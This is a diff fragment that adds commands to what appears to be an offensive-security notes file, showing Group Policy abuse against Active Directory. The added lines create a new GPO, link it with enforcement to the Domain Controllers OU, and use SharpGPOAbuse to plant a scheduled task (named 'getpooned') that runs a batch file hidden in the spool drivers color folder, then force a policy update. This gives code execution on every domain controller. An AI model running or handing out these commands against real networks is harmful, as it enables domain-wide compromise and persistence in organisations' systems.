@@ -296,6 +296,23 @@ done
 
 
 
+
+```
+shell new-gpo -name ropeoftheneck | new-gplink -target "OU=Domain Controllers,DC=DOMAIN,DC=LOCAL" -LinkEnabled Yes -Enforced Yes -Order 1 
+```
+```
+shell .\SharpGPOAbuse-merge.exe --addcomputertask --taskname "getpooned" --author "DOMAIN\administrator" --command "cmd.exe" --arguments "/c \Windows\system32\spool\drivers\color\launcher.bat" --gponame "ropeoftheneck" --force 
+```
+```
+gpupdate /force 
+```
+
+
+
+
+
+
+
 ****
 Shortcut with powershell
 ```powershell
